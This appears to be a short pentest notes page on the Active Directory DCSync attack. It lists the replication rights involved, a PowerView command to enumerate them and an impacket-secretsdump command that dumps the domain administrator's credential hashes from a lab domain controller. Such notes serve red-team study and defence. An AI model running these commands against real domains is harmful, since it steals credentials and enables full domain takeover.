---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# DCSync

## Information

Includes the following rights:

{% hint style="success" %}
* `GetChanges` → internal/technical permission name used in APIs and LDAP.
* `Replication-Directory-Changes` → friendly display name for the same permission.
{% endhint %}

1. `Replication-Get-Changes` / `GetChanges`
2. `Replication-Directory-Changes-All` / `GetChangesAll`&#x20;
3. `Replication-Directory-Changes-In-Filtered-Set` / `GetChangesInFilteredSet` (not always)

Default setting: Domain Admins, Enterprise Admins, Administrators, and Domain Controllers.

## Exploitation

{% tabs %}
{% tab title="PowerView" %}
Enumerate rights:

{% code overflow="wrap" %}
```powershell
Get-ObjectAcl -DistinguishedName "dc=x7331,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
{% endcode %}
{% endtab %}

{% tab title="Impacket" %}
Dump NTDS:

{% code overflow="wrap" %}
```bash
impacket-secretsdump x7331.local/user:pass@<dc-ip> -just-dc-user administrator    
```
{% endcode %}
{% endtab %}
{% endtabs %}
